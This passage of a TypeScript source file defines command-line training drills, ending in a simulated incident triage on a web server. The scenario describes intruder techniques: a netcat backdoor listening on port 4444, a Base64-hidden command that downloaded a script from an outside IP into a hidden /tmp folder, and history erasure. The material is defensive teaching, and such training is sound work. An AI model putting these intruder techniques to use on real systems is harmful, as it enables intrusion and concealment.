    explain: "`600` = `-rw-------`: you can read and write, nobody else can do anything. Secrets, SSH keys and API tokens should always look like this.", check: { uses: ["chmod"], mode: { path: `${HOME}/data/api-token.txt`, is: "-rw-------" } } },

  // Level 9 — change text
  { id: "tr-upper", level: 9, title: "Shout it", task: "Show notes.txt in CAPITAL LETTERS.", hint: "tr a-z A-Z swaps each lowercase letter for its capital. tr only reads from a pipe or <, so feed it the file.", example: "tr a-z A-Z < notes.txt",
    explain: "`tr` swaps characters one-for-one: a→A, b→B… `< notes.txt` feeds the file in as input (the opposite of `>`). `cat notes.txt | tr a-z A-Z` works too.", check: { uses: ["tr"], exact: text(notesLines.map((l) => l.toUpperCase())) } },
  { id: "tr-rot13", level: 9, title: "Decode ROT13 yourself", task: "messages/rot13.txt is ROT13-encoded (every letter moved 13 places). Decode it with tr.", hint: "Map A-Z onto N-Z then A-M (and the same for lowercase): tr 'A-Za-z' 'N-ZA-Mn-za-m'", example: "tr 'A-Za-z' 'N-ZA-Mn-za-m' < messages/rot13.txt",
    explain: "ROT13 shifts every letter 13 places, so doing it twice gets you back to the start — the same command encodes and decodes. You just built a decoder from one `tr`.", check: { uses: ["tr"], out: [rot13Plain] } },
  { id: "rev", level: 9, title: "Read it backwards", task: "messages/backwards.txt was written back to front. Show it the right way round.", hint: "rev reverses each line.", example: "rev messages/backwards.txt",
    explain: "`rev` flips every line character by character. Reversed text is a common trick in puzzles and in hiding strings from a simple search.", check: { uses: ["rev"], out: [backwardsPlain] } },
  { id: "sed-redact", level: 9, title: "Redact before you share", task: "Show projects/website/config.bak with the password changeme123 replaced by REDACTED (don't change the file itself).", hint: "sed 's/old/new/' replaces text as it prints.", example: "sed 's/changeme123/REDACTED/' projects/website/config.bak",
    explain: "`s/old/new/` = substitute. Add `g` at the end to replace every match on a line, not just the first. Redacting secrets before pasting output into a ticket or report is good practice.", check: { uses: ["sed"], out: ["DB_PASSWORD=REDACTED", "db_host=localhost"], outNot: ["changeme123"] } },

  // Level 10 — check and compare
  { id: "sha256", level: 10, title: "Fingerprint a file", task: "Print the SHA-256 fingerprint (hash) of downloads/tool.sh.", hint: "sha256sum FILE.", example: "sha256sum downloads/tool.sh",
    explain: "A hash is a fingerprint: change even one character of the file and it changes completely. Publishers list hashes so you can prove a download wasn't altered.", check: { uses: ["sha256sum"], out: [toolHash] } },
  { id: "sha256-check", level: 10, title: "Was a download tampered with?", task: "downloads/CHECKSUMS.txt lists the publisher's fingerprints. Check both downloads against it.", hint: "sha256sum -c reads the list and checks each file — run it from inside the downloads folder, because the list uses plain file names.", example: "cd downloads && sha256sum -c CHECKSUMS.txt",
    explain: "`update.sh: FAILED` — that file was changed after the publisher released it. `tail update.sh` shows the extra line someone added at the bottom. Never run a download whose hash doesn't match. (Type `cd` to go back home before the next drill.)", check: { uses: ["sha256sum"], cmdRe: "-c", out: ["tool.sh: OK", "update.sh: FAILED"] } },
  { id: "diff", level: 10, title: "What changed?", task: "Compare config/firewall.old with config/firewall.new and show what's different.", hint: "diff OLD NEW — lines with < are only in the old file, lines with > only in the new one.", example: "diff config/firewall.old config/firewall.new",
    explain: "Two risky changes: SSH (port 22) is now open to anyone instead of the internal network, and a new rule opens port 4444. Reviewing config diffs is how teams catch mistakes — and intruders — before they matter.", check: { uses: ["diff"], out: ["> allow 4444/tcp from any", "< allow 22/tcp from 10.0.0.0/8"] } },

  // Level 11 — triage a machine
  { id: "ps-aux", level: 11, title: "What's running?", task: "List every program running on this machine, for all users.", hint: "ps on its own shows only your own programs; ps aux shows everyone's.", example: "ps aux",
    explain: "`a` = all users, `u` = show the owner, `x` = include background services. Read the USER and COMMAND columns: one program here runs from /tmp and is using far more CPU than anything else.", check: { uses: ["ps"], out: ["/sbin/init", "nginx: worker process"] } },
  { id: "ps-grep", level: 11, title: "Find one process", task: "Show only the running processes that mention sync.", hint: "Pipe ps aux into grep.", example: "ps aux | grep sync",
    explain: "`/tmp/.cache/sync.sh`, run by the deploy account. Programs running from /tmp — especially from a hidden folder (the dot in .cache) — are a classic warning sign.", check: { uses: ["ps", "grep"], out: ["/tmp/.cache/sync.sh"], outNot: ["/sbin/init"] } },
  { id: "ss", level: 11, title: "Which ports are open?", task: "List the TCP ports this machine is listening on, shown as numbers.", hint: "ss -tln: t = TCP, l = listening, n = numbers instead of names.", example: "ss -tln",
    explain: "22 (SSH) and 80 (web) are expected, and 5432 (database) only listens on 127.0.0.1 — this machine only. Port 4444 open to everyone (0.0.0.0) is not something this server should have.", check: { uses: ["ss"], out: [":4444", ":22"] } },
  { id: "ss-p", level: 11, title: "Who owns that port?", task: "Find out which program is listening on port 4444.", hint: "Add -p to ss to show the program, then grep for the port.", example: "ss -tlnp | grep 4444",
    explain: "It's `nc` (netcat), PID 1340 — the same deploy account that's running sync.sh. A netcat listener on a server is a strong sign of a backdoor. Next step for a defender: isolate the machine and preserve evidence.", check: { uses: ["ss", "grep"], out: ["\"nc\"", "4444"], outNot: ["\"sshd\""] } },
  { id: "login-shells", level: 11, title: "Who can log in?", task: "Show the names of the accounts in /etc/passwd whose shell is /bin/bash (the last field).", hint: "grep for lines ending in bash (bash$ — $ means end of line), then cut out the first field.", example: "grep 'bash$' /etc/passwd | cut -d: -f1",
    explain: `${shellAccounts.join(", ")} have a real shell; the rest use nologin. Accounts that can log in are the ones to protect — and deploy is the one used in this incident.`, check: { usesAny: ["grep", "awk"], exact: text(shellAccounts) } },

  // Level 12 — investigate an incident
  { id: "inv-failed", level: 12, title: "Who kept failing?", task: "Incident on web01. Start with logs/auth.log: count the failed logins per IP address, biggest first.", hint: "grep Failed, take the IP (word 11) with awk, then sort | uniq -c | sort -nr.", example: "grep Failed logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr",
    explain: `${Object.entries(failedBy).sort((a, b) => b[1] - a[1]).map(([ip, n]) => `${ip} failed ${n} times`).join(", ")}. Lots of failures from one address is password guessing.`, check: { uses: ["uniq"], outLines: Object.entries(failedBy).map(([ip, n]) => `${n} ${ip}`) } },
  { id: "inv-users", level: 12, title: "Which usernames were tried?", task: "List each username that had a failed login, once each, sorted.", hint: "grep Failed, print word 9 with awk, then sort -u.", example: "grep Failed logs/auth.log | awk '{print $9}' | sort -u",
    explain: `${triedUsers.join(", ")} — common default names. Guessing the usual suspects is what automated attacks do; strong passwords and SSH keys defeat it.`, check: { usesAny: ["sort", "uniq"], exact: text(triedUsers) } },
  { id: "inv-in", level: 12, title: "Who actually got in?", task: "Show the user and IP address of every successful (Accepted) login.", hint: "grep Accepted, then awk '{print $9, $11}'.", example: "grep Accepted logs/auth.log | awk '{print $9, $11}'",
    explain: "alice logged in from the internal network (10.x). deploy logged in from 198.51.100.4 — an outside address — right after the guessing. That's the login to look at.", check: { usesAny: ["awk", "cut"], exact: text(loggedIn) } },
  { id: "inv-scanner", level: 12, title: "What was the scanner after?", task: "List the pages that 203.0.113.7 requested in logs/access.log.", hint: "grep the IP, then print the path (word 7) with awk.", example: "grep 203.0.113.7 logs/access.log | awk '{print $7}'",
    explain: "/.env, /.git/config, /backup.zip, /wp-login.php… a shopping list of files that often leak secrets. All 404s here — good — but it shows exactly what to keep off a web server.", check: { usesAny: ["awk", "cut"], exact: text(scannerPaths) } },
  { id: "inv-decode", level: 12, title: "Decode the hidden command", task: "logs/deploy_history.txt is the deploy account's command history. One line hides a command in Base64 — decode it.", hint: "Find the line with grep base64, then echo the encoded text into base64 -d.", example: `echo ${encodedCmd} | base64 -d`,
    explain: "It downloaded sync.sh from 203.0.113.7 into the hidden /tmp/.cache folder — the same script you saw running. Encoding a command hides it from a simple search; the `history -c` at the end tried to erase the trail.", check: { uses: ["base64"], out: [decodedCmd] } },
  { id: "inv-evidence", level: 12, title: "Collect the evidence", task: "Save every line that mentions 198.51.100.4, from all the logs in the logs folder, into a file called attacker.txt.", hint: "grep -r (or grep with logs/*.log) searches several files; > saves the result.", example: "grep -r 198.51.100.4 logs > attacker.txt",
    explain: "One file now holds the intruder's web requests and their SSH login, each labelled with the log it came from. You've done a real triage: failed logins → the successful one → what was downloaded → what's running → evidence saved.", check: { usesAny: ["grep"], file: { paths: [`${HOME}/attacker.txt`, `${HOME}/evidence/attacker.txt`], has: ["Accepted password for deploy", "POST /login"] } } },
];

export const drillById: Record<string, Drill> = Object.fromEntries(drills.map((d) => [d.id, d]));
// Indices of `drills` in the order learners see them: by level, then as listed.
export const drillOrder: number[] = drills.map((_, i) => i).sort((a, b) => drills[a].level - drills[b].level || a - b);
export const DOJO_ID = "cmd-dojo";
